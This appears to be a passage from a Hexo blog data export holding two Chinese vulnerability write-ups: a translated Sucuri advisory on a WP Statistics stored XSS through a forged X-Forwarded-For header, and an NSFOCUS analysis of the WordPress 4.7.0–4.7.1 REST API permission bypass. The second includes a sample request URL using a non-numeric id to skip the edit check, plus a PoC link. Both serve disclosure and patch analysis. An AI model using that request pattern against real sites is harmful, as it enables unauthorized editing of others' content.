title=\"技术细节\"></a>技术细节</h2><p>该插件使用<strong>class-wp-statistics.php</strong>文件中的<strong>get_IP</strong>方法。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umSQud.png\" alt=\"umSQud.png\"></p>\n<p>IP变量的默认值为设置中提供的header，默认情况下为<strong>REMOTE_ADDR（译者注：默认配置情况下不存在漏洞，具体配置见上文插件的设置页面）</strong>。如果有多个以逗号分隔的IP地址，则该插件将使用最后一个有效的IP地址</p>\n<p>由于IP地址的默认值是header的值，并且未使用<strong>FILTER_VALIDATE_IP</strong>方法进行清理或验证，因此当header中没有多个IP地址时，它将按原样存储。</p>\n<p>在top visitor，online users与最近访问者等模块中，访问者IP将作为页面的一部分输出，它是插件概述页面的一部分。</p>\n<p><strong>（译者注：我对于上述的理解是，插件设置页面提供了一个用户自己选择获取ip的方式”the items below return the ip address that is different on each server. Is the best way that you choose”，如果用户选的是X_Forwarded_For方式，$user_ip里获得的是X_Forwarded_For中的值，攻击者在X_Forwarded_For中传入xss payload，由于不是合法的ip格式，在foreach里的filter_var结果为false，因此不会进入if中执行$user_ip=$ip语句，$user_ip中值仍然是xss payload，最终，在代码最后一个else中赋值给$this-&gt;ip并return）</strong></p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>某种类型的信息看起来可能是安全的（像是访问者的IP地址），但实际上与预期相悖。由于开发人员的某些臆断，使得攻击者可以在在管理页面上注入恶意代码，从而导致整个网络瘫痪。</p>\n<p>为了不受此漏洞影响，我们强烈建议用户尽快将插件更新到<strong>12.6.7</strong>版。</p>\n<p>原文地址：<a href=\"https://blog.sucuri.net/2019/07/wordpress-plugin-wp-statistics-unauthenticated-stored-xss-under-certain-configurations.html\">https://blog.sucuri.net/2019/07/wordpress-plugin-wp-statistics-unauthenticated-stored-xss-under-certain-configurations.html</a></p>\n<h2 id=\"写在翻译稿后面\"><a href=\"#写在翻译稿后面\" class=\"headerlink\" title=\"写在翻译稿后面\"></a>写在翻译稿后面</h2><p>我跟踪了下wp-statistics的修复</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umS1HI.png\" alt=\"umS1HI.png\"></p>\n<p>使用esc_html对获取到的IP进行过滤</p>\n<p>虽然现在仍然可以在header里传payload，但是由于esc_html的转义，到页面渲染的时候，payload已经失效，流程见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/09/26/umS8Et.png\" alt=\"umS8Et.png\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。</p>\n<p>这篇文章是来自Sucuri Labs，本文介绍了强大的 WordPress 统计分析插件 WP Statistics的一个xss漏洞以及与防火墙的组合利用，文中括号加粗的是我自己分析这个原稿的一些见解，大家可以在评论里一起讨论下。</p>","more":"<p>下面翻译稿正文开始</p>\n<p><strong>风险评级：</strong>次要：可用于有针对性攻击，但需要特定配置后利用。</p>\n<p>漏洞名称：存储型XSS漏洞</p>\n<p>修复版本： 12.6.7</p>\n<p>WordPress插件<a href=\"https://wordpress.org/plugins/wp-statistics/\">WP Statistics</a>具有50万用户的活动安装基础，在<strong>12.6.7</strong>之前的版本上存在未经<strong>身份</strong>验证的存储XSS漏洞。</p>\n<p>此漏洞只能在某些配置下使用 - 默认设置不易受到攻击。</p>\n<h2 id=\"时间线\"><a href=\"#时间线\" class=\"headerlink\" title=\"时间线\"></a>时间线</h2><p>·   2019/06/26 - 初步与开发人员取得联系。</p>\n<p>·   2019/06/27 - 开发人员回应，披露漏洞。</p>\n<p>·   2019/06/30 - 拟议审核补丁。</p>\n<p>·   2019/07/01 - 版本12.6.7发布，修复漏洞。</p>\n<h2 id=\"通过IP操作存储型XSS漏洞\"><a href=\"#通过IP操作存储型XSS漏洞\" class=\"headerlink\" title=\"通过IP操作存储型XSS漏洞\"></a>通过IP操作存储型XSS漏洞</h2><p>在该插件某些配置情况下，网站可以使用header来查找访问者的IP。</p>\n<p>在使用防火墙的环境中，经常会需要这样的方式**(译者注：使用header来查找访问者的IP)**，否则所有访问者都会拥代理的IP而不是自己的IP。</p>\n<h3 id=\"为什么使用防火墙需要使用Header\"><a href=\"#为什么使用防火墙需要使用Header\" class=\"headerlink\" title=\"为什么使用防火墙需要使用Header\"></a>为什么使用防火墙需要使用Header</h3><p>默认情况下，网站可以轻松找到访问用户的IP地址。并且找到的一定是发起请求User的IP，如下图所示：</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umSZ4K.png\" alt=\"umSZ4K.png\"></p>\n<p>请求访问没有防火墙的网站</p>\n<p>当使用网站防火墙时，事情就会变得有些棘手；要么优化我们的性能，要么保护我们自己免受攻击。</p>\n<p>由于用户的请求在到达网站前，已经通过了防火墙，因此网站无法利用连接地址来找出实际发起请求的IP。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umSm9O.png\" alt=\"umSm9O.png\"></p>\n<p>忽略原始用户IP，使用防火墙代理发起访问请求</p>\n<p>为了解决这种情况，防火墙通常会在HTTP header中自动添加用户原始IP。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umSuge.png\" alt=\"umSuge.png\"></p>\n<p>防火墙会转送请求访问的原始用户IP</p>\n<p>这使得网站能够正确识别原始用户以及其相应的IP。</p>\n<h3 id=\"多层防火墙\"><a href=\"#多层防火墙\" class=\"headerlink\" title=\"多层防火墙\"></a>多层防火墙</h3><p>当攻击者自己构造forwarded IP（即使这个IP并不存在）时，可能会使服务器弄错原始IP。<strong>（译者注：这里的意思是，攻击者在自己发出的原始报文中，加入了一个forwarded IP，例如下图中，加入一个Forwarded: 123,当最终website读取用户IP时，会误认为123是原始IP，即使123可能不存在）</strong>使用多层防火墙时也会有这种情况出现，因为每一层都会在现有的基础上再添加一个IP地址。</p>\n<p>这完全取决于防火墙的配置方式，以及它如何处理现有的转送数据。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umSn3D.png\" alt=\"umSn3D.png\"></p>\n<p>用户发送一个forwarded IP，混淆服务器</p>\n<p>大多数防火墙都会将用户的真实IP加入HTTP header自定义字段里，例如<strong>X_SUCURI_CLIENTIP（译者注：SUCURI是这篇文章的公司的名字，这个字段是他家防火墙header里的存放用户的真实IP的自定义字段）</strong>。</p>\n<p>此HTTP header里始终含有用户原始IP信息，因为它应该永远不会存在于防火墙之外的环境里。因此，即使存在也会被被覆盖<strong>（译者注：即使攻击者在自己的报文里构造了X_SUCURI_CLIENTIP，在被SUCURI防火墙转发时，这个值也会被覆盖掉）</strong>。</p>\n<p>在您有多个代理的情况下，您可能希望获取用户真实IP，而不是最后进行连接的IP。在这种情况下，您可以使用可包含多个IP地址的<strong>X-forwarded-for</strong>。</p>\n<p>如果<strong>X-forwarded-for</strong>在连接防火墙之前已具有IP值，则将执行以下某一项操作：</p>\n<p>·   将用户的IP附加到任意现有IP列表中。</p>\n<p>·   保持原样; 不添加或替换值。</p>\n<p>·   清除header; 删除所有值。</p>\n<p>·   使用用户的IP覆盖header。</p>\n<p>这些结果可能取决于所使用的防火墙和它的配置的不同而不同，最终保证多级防火墙来正确地发送所述用户信息给服务器。</p>\n<p><a href=\"https://imgchr.com/i/umSVN6\"><img src=\"https://s2.ax1x.com/2019/09/26/umSVN6.png\" alt=\"umSVN6.png\"></a></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>该插件的漏洞是由于不过滤或验证用户IP所产生的。</p>\n<p>只有当插件使用header字段来识别访问者的IP地址（例如，不是<strong>REMOTE_ADDR</strong>）时，才能触发利用：</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umSKjH.png\" alt=\"umSKjH.png\"></p>\n<p>插件的设置页面：使用X_Forwarded_For来获取IP</p>\n<p>该漏洞利用触发还必须满足以下两个条件之一：</p>\n<p>·   防火墙必须是可<em>绕过的</em>。*</p>\n<p>*这意味着必须将网站配置为接受来自于所有人的连接，而不仅仅是接受使用防火墙端口转发的连接。</p>\n<p><strong>(译者注：这里作者“防火墙必须是可绕过”的意思是，攻击者的请求，可以不经过防火墙，直接发送至wordpress站点)</strong></p>\n<p><strong>或者</strong></p>\n<p>·   防火墙必须原样保留header，如果其存在的话。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umSlDA.png\" alt=\"umSlDA.png\"></p>\n<p>防火墙转发访问请求时保持forwarded IP不变</p>\n<p>以上两个利用条件的共同点是forwarded值完全由攻击者控制。</p>\n<p>启用WAF使您不会容轻易遭受攻击（请<a href=\"https://kb.sucuri.net/firewall/Configuration/preventing-bypass\">参阅此处以获取有关如何防止防火墙旁路的说明</a>），除非攻击者可以绕过WAF；或者防火墙被配置为保持IP不变。</p>\n<p>如果您以前使用过WAF，但是在未更新插件设置的情况下停止运行，则可能会受到攻击。</p>\n<p>由于header可以包含多个IP地址，具体取决于防火墙的数量及其配置，因此插件将首先取出完整的header IP列表值，然后在提供多个地址的情况下遍历IP列表，依次向右边的寻找并将IP值替换为有效地址**(译者注：原理可以看下面那个代码段的图)**。</p>\n<p>在这两种易受攻击的配置中， IP变量完全由攻击者控制。这使得他们可以将恶意JavaScript代码作为自己的IP注入，并将这些代码存储在管理页面上并执行。</p>\n<h2 id=\"技术细节\"><a href=\"#技术细节\" class=\"headerlink\" title=\"技术细节\"></a>技术细节</h2><p>该插件使用<strong>class-wp-statistics.php</strong>文件中的<strong>get_IP</strong>方法。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umSQud.png\" alt=\"umSQud.png\"></p>\n<p>IP变量的默认值为设置中提供的header，默认情况下为<strong>REMOTE_ADDR（译者注：默认配置情况下不存在漏洞，具体配置见上文插件的设置页面）</strong>。如果有多个以逗号分隔的IP地址，则该插件将使用最后一个有效的IP地址</p>\n<p>由于IP地址的默认值是header的值，并且未使用<strong>FILTER_VALIDATE_IP</strong>方法进行清理或验证，因此当header中没有多个IP地址时，它将按原样存储。</p>\n<p>在top visitor，online users与最近访问者等模块中，访问者IP将作为页面的一部分输出，它是插件概述页面的一部分。</p>\n<p><strong>（译者注：我对于上述的理解是，插件设置页面提供了一个用户自己选择获取ip的方式”the items below return the ip address that is different on each server. Is the best way that you choose”，如果用户选的是X_Forwarded_For方式，$user_ip里获得的是X_Forwarded_For中的值，攻击者在X_Forwarded_For中传入xss payload，由于不是合法的ip格式，在foreach里的filter_var结果为false，因此不会进入if中执行$user_ip=$ip语句，$user_ip中值仍然是xss payload，最终，在代码最后一个else中赋值给$this-&gt;ip并return）</strong></p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>某种类型的信息看起来可能是安全的（像是访问者的IP地址），但实际上与预期相悖。由于开发人员的某些臆断，使得攻击者可以在在管理页面上注入恶意代码，从而导致整个网络瘫痪。</p>\n<p>为了不受此漏洞影响，我们强烈建议用户尽快将插件更新到<strong>12.6.7</strong>版。</p>\n<p>原文地址：<a href=\"https://blog.sucuri.net/2019/07/wordpress-plugin-wp-statistics-unauthenticated-stored-xss-under-certain-configurations.html\">https://blog.sucuri.net/2019/07/wordpress-plugin-wp-statistics-unauthenticated-stored-xss-under-certain-configurations.html</a></p>\n<h2 id=\"写在翻译稿后面\"><a href=\"#写在翻译稿后面\" class=\"headerlink\" title=\"写在翻译稿后面\"></a>写在翻译稿后面</h2><p>我跟踪了下wp-statistics的修复</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umS1HI.png\" alt=\"umS1HI.png\"></p>\n<p>使用esc_html对获取到的IP进行过滤</p>\n<p>虽然现在仍然可以在header里传payload，但是由于esc_html的转义，到页面渲染的时候，payload已经失效，流程见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/26/umS8Et.png\" alt=\"umS8Et.png\"></p>"},{"title":"WordPress REST API 内容注入漏洞分析","date":"2017-09-10T07:11:17.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nWordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。<!--more-->\n\nWordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0-4.7.1版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限对文章进行增删改查操作。\n\n## 影响版本\n\nWordPress 4.7.0-4.7.1\n\n## 漏洞分析\n\n在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png)\n\n具体使用详情请参照REST API Handbook\n\nhttps://developer.wordpress.org/rest-api/\n\n在使用api对文章进行操作之前，需要对操作进行授权，授权方式有三种：cookie、oauth和简单认证。如果不进行授权直接通过api对文章进行修改操作，会返回一个401，如下图所示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png)\n\n如果想成功利用漏洞，必须绕过权限管理。我们跟踪下后台update处权限管理代码\n\n<pre class=\"lang:default decode:true \">public function update_item_permissions_check( $request ) {\n\n   $post = get_post( $request['id'] );\n   $post_type = get_post_type_object( $this-&gt;post_type );\n\n   if ( $post &amp;&amp; ! $this-&gt;check_update_permission( $post ) ) {\n      return new WP_Error( 'rest_cannot_edit', __( 'Sorry, you are not allowed to edit this post.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['author'] ) &amp;&amp; get_current_user_id() !== $request['author'] &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_edit_others', __( 'Sorry, you are not allowed to update posts as this user.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['sticky'] ) &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_assign_sticky', __( 'Sorry, you are not allowed to make posts sticky.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! $this-&gt;check_assign_terms_permission( $request ) ) {\n      return new WP_Error( 'rest_cannot_assign_term', __( 'Sorry, you are not allowed to assign the provided terms.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return true;\n}\n</pre>\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/614b6c67791a249dd43c54954278af11.png)\n\n如上图所示，在这里if语句中，前半部分$post为真，后半部分check_update_permission()函数对$post的权限进行判断，结果为假，导致返回Sorry, you are not allowed to edit this post信息。\n\n这个漏洞的挑战就在于，如何成功的绕过update_item_permissions_check()模块，使其最终return true。\n\n我们回头看update_item_permissions_check()函数，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/5b666100fc09a0a4a7e0f09447e0e807.png)\n\n注意到$post = get_post( $request['id'] );这一行，这一行的作用是判断提交的文章id是否存在。\n\n<pre class=\"lang:default decode:true \">function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {\n   if ( empty( $post ) &amp;&amp; isset( $GLOBALS['post'] ) )\n      $post = $GLOBALS['post'];\n\n   if ( $post instanceof WP_Post ) {\n      $_post = $post;\n   } elseif ( is_object( $post ) ) {\n      if ( empty( $post-&gt;filter ) ) {\n         $_post = sanitize_post( $post, 'raw' );\n         $_post = new WP_Post( $_post );\n      } elseif ( 'raw' == $post-&gt;filter ) {\n         $_post = new WP_Post( $post );\n      } else {\n         $_post = WP_Post::get_instance( $post-&gt;ID );\n      }\n   } else {\n      $_post = WP_Post::get_instance( $post );\n   }\n\n   if ( ! $_post )\n      return null;\n\n   $_post = $_post-&gt;filter( $filter );\n\n   if ( $output == ARRAY_A )\n      return $_post-&gt;to_array();\n   elseif ( $output == ARRAY_N )\n      return array_values( $_post-&gt;to_array() );\n\n   return $_post;\n}\n</pre>\n\n可见，如果id对应的文章不存在，则返回null。\n\n如果我们输入的url是这种形式\n\nhttp://192.168.3.112/wordpress/index.php/wp-json/wp/v2/posts/1/?id=1grq\n\nget_post()函数返回值一定为null，这样会使得$post值为null，回头来看update_item_permissions_check()函数，这时update_item_permissions_check()函数的返回值竟然为true了！\n\n既然update_item_permissions_check()函数的返回值为true，说明我们绕过了update_item_permissions_check()权限验证，但是id为‘1grq’，根本不存在这样数字加字母组合的文章id，那怎么才能对指定文章进行越权操作呢？\n\n有趣的事情发生了，让我们来看update_item()函数，这个函数是用来update通过权限验证的数据，我们看看它是怎么定义的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/6f07e62c711ced1616ab49bf0aa23e63.png)\n\n注意第二行，这里将$request['id']进行了int类型的数值转换，在php中，$request['id'] =”1grq”会被转换为数值类型1，如下图演示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/2fc4a0b18c5f936a8442712acf931321.png)\n\n所以这里的$id又由‘1grq’变回1了，get_post()函数也会找到对应id为1的文章了。\n\n**漏洞利用**\n\n目前已经有研究员在GitHub上给出相应的poc，链接如下\n\nhttps://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab\n\n**官方修补方案分析**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/687871c5f29c5e5a8ae2f59d588c441c.png)\n\n在4.7.2版本中，如果get_post()判定$post结果为 false，则直接返回$post，避免$post进入下层if判定绕过权限检查。\n\n**修补防御**\n\n升级wordpress至最新版本（4.7.2）。\n\n### **关于绿盟科技**\n\n北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。\n\n基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。\n\n北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169\n直接询问：010-68438880\n\n<div id=\"page\" class=\"hfeed site\"></div>","source":"_posts/WordPress-REST-API-RCE.md","raw":"---\ntitle: WordPress REST API 内容注入漏洞分析\ndate: 2017-09-10 15:11:17\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nWordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。<!--more-->\n\nWordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0-4.7.1版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限对文章进行增删改查操作。\n\n## 影响版本\n\nWordPress 4.7.0-4.7.1\n\n## 漏洞分析\n\n在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png)\n\n具体使用详情请参照REST API Handbook\n\nhttps://developer.wordpress.org/rest-api/\n\n在使用api对文章进行操作之前，需要对操作进行授权，授权方式有三种：cookie、oauth和简单认证。如果不进行授权直接通过api对文章进行修改操作，会返回一个401，如下图所示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png)\n\n如果想成功利用漏洞，必须绕过权限管理。我们跟踪下后台update处权限管理代码\n\n<pre class=\"lang:default decode:true \">public function update_item_permissions_check( $request ) {\n\n   $post = get_post( $request['id'] );\n   $post_type = get_post_type_object( $this-&gt;post_type );\n\n   if ( $post &amp;&amp; ! $this-&gt;check_update_permission( $post ) ) {\n      return new WP_Error( 'rest_cannot_edit', __( 'Sorry, you are not allowed to edit this post.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['author'] ) &amp;&amp; get_current_user_id() !== $request['author'] &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_edit_others', __( 'Sorry, you are not allowed to update posts as this user.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['sticky'] ) &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_assign_sticky', __( 'Sorry, you are not allowed to make posts sticky.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! $this-&gt;check_assign_terms_permission( $request ) ) {\n      return new WP_Error( 'rest_cannot_assign_term', __( 'Sorry, you are not allowed to assign the provided terms.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return true;\n}\n</pre>\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/614b6c67791a249dd43c54954278af11.png)\n\n如上图所示，在这里if语句中，前半部分$post为真，后半部分check_update_permission()函数对$post的权限进行判断，结果为假，导致返回Sorry, you are not allowed to edit this post信息。\n\n这个漏洞的挑战就在于，如何成功的绕过update_item_permissions_check()模块，使其最终return true。\n\n我们回头看update_item_permissions_check()函数，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/5b666100fc09a0a4a7e0f09447e0e807.png)\n\n注意到$post = get_post( $request['id'] );这一行，这一行的作用是判断提交的文章id是否存在。\n\n<pre class=\"lang:default decode:true \">function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {\n   if ( empty( $post ) &amp;&amp; isset( $GLOBALS['post'] ) )\n      $post = $GLOBALS['post'];\n\n   if ( $post instanceof WP_Post ) {\n      $_post = $post;\n   } elseif ( is_object( $post ) ) {\n      if ( empty( $post-&gt;filter ) ) {\n         $_post = sanitize_post( $post, 'raw' );\n         $_post = new WP_Post( $_post );\n      } elseif ( 'raw' == $post-&gt;filter ) {\n         $_post = new WP_Post( $post );\n      } else {\n         $_post = WP_Post::get_instance( $post-&gt;ID );\n      }\n   } else {\n      $_post = WP_Post::get_instance( $post );\n   }\n\n   if ( ! $_post )\n      return null;\n\n   $_post = $_post-&gt;filter( $filter );\n\n   if ( $output == ARRAY_A )\n      return $_post-&gt;to_array();\n   elseif ( $output == ARRAY_N )\n      return array_values( $_post-&gt;to_array() );\n\n   return $_post;\n}\n</pre>\n\n可见，如果id对应的文章不存在，则返回null。\n\n如果我们输入的url是这种形式\n\nhttp://192.168.3.112/wordpress/index.php/wp-json/wp/v2/posts/1/?id=1grq\n\nget_post()函数返回值一定为null，这样会使得$post值为null，回头来看update_item_permissions_check()函数，这时update_item_permissions_check()函数的返回值竟然为true了！\n\n既然update_item_permissions_check()函数的返回值为true，说明我们绕过了update_item_permissions_check()权限验证，但是id为‘1grq’，根本不存在这样数字加字母组合的文章id，那怎么才能对指定文章进行越权操作呢？\n\n有趣的事情发生了，让我们来看update_item()函数，这个函数是用来update通过权限验证的数据，我们看看它是怎么定义的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/6f07e62c711ced1616ab49bf0aa23e63.png)\n\n注意第二行，这里将$request['id']进行了int类型的数值转换，在php中，$request['id'] =”1grq”会被转换为数值类型1，如下图演示\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/2fc4a0b18c5f936a8442712acf931321.png)\n\n所以这里的$id又由‘1grq’变回1了，get_post()函数也会找到对应id为1的文章了。\n\n**漏洞利用**\n\n目前已经有研究员在GitHub上给出相应的poc，链接如下\n\nhttps://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab\n\n**官方修补方案分析**\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/02/687871c5f29c5e5a8ae2f59d588c441c.png)\n\n在4.7.2版本中，如果get_post()判定$post结果为 false，则直接返回$post，避免$post进入下层if判定绕过权限检查。\n\n**修补防御**\n\n升级wordpress至最新版本（4.7.2）。\n\n### **关于绿盟科技**\n\n北京神州绿盟信息安全科技股份有限公司（简称绿盟科技）成立于2000年4月，总部位于北京。在国内外设有30多个分支机构，为政府、运营商、金融、能源、互联网以及教育、医疗等行业用户，提供具有核心竞争力的安全产品及解决方案，帮助客户实现业务的安全顺畅运行。\n\n基于多年的安全攻防研究，绿盟科技在网络及终端安全、互联网基础安全、合规及安全管理等领域，为客户提供入侵检测/防护、抗拒绝服务攻击、远程安全评估以及Web安全防护等产品以及专业安全服务。\n\n北京神州绿盟信息安全科技股份有限公司于2014年1月29日起在深圳证券交易所创业板上市交易，股票简称：绿盟科技，股票代码：300369。\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169\n直接询问：010-68438880\n\n<div id=\"page\" class=\"hfeed site\"></div>","slug":"WordPress-REST-API-RCE","published":1,"updated":"2020-10-27T09:27:09.859Z","_id":"ckgrozu8u001twsa98zaigyqw","comments":1,"layout":"post","photos":[],"link":"","content":"<p>WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统来使用。<a id=\"more\"></a></p>\n<p>WordPress 在4.7.0版本之后将REST API插件集成到默认功能之中。REST API为WordPress的使用者提供了一个方便快捷的管理接口。在WordPress 4.7.0-4.7.1版本中,存在着一个越权漏洞，成功的利用这个漏洞，可以绕过管理员权限对文章进行增删改查操作。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>WordPress 4.7.0-4.7.1</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>在正式的漏洞分析开始前，先来简单介绍下REST API的使用。官网给出的介绍如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png\"></p>\n<p>具体使用详情请参照REST API Handbook</p>\n<p><a href=\"https://developer.wordpress.org/rest-api/\">https://developer.wordpress.org/rest-api/</a></p>\n<p>在使用api对文章进行操作之前，需要对操作进行授权，授权方式有三种：cookie、oauth和简单认证。如果不进行授权直接通过api对文章进行修改操作，会返回一个401，如下图所示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/c095f00fa1cc64abde17d4bbeb44f5a1.png\"></p>\n<p>如果想成功利用漏洞，必须绕过权限管理。我们跟踪下后台update处权限管理代码</p>\n<pre class=\"lang:default decode:true \">public function update_item_permissions_check( $request ) {\n\n   $post = get_post( $request['id'] );\n   $post_type = get_post_type_object( $this-&gt;post_type );\n\n   if ( $post &amp;&amp; ! $this-&gt;check_update_permission( $post ) ) {\n      return new WP_Error( 'rest_cannot_edit', __( 'Sorry, you are not allowed to edit this post.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['author'] ) &amp;&amp; get_current_user_id() !== $request['author'] &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_edit_others', __( 'Sorry, you are not allowed to update posts as this user.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! empty( $request['sticky'] ) &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) {\n      return new WP_Error( 'rest_cannot_assign_sticky', __( 'Sorry, you are not allowed to make posts sticky.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   if ( ! $this-&gt;check_assign_terms_permission( $request ) ) {\n      return new WP_Error( 'rest_cannot_assign_term', __( 'Sorry, you are not allowed to assign the provided terms.' ), array( 'status' =&gt; rest_authorization_required_code() ) );\n   }\n\n   return true;\n}\n</pre>\n\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/02/614b6c67791a249dd43c54954278af11.png\"></p>\n<p>如上图所示，在这里if语句中，前半部分$post为真，后半部分check_update_permission()函数对$post的权限进行判断，结果为假，导致返回Sorry, you are not allowed to edit this 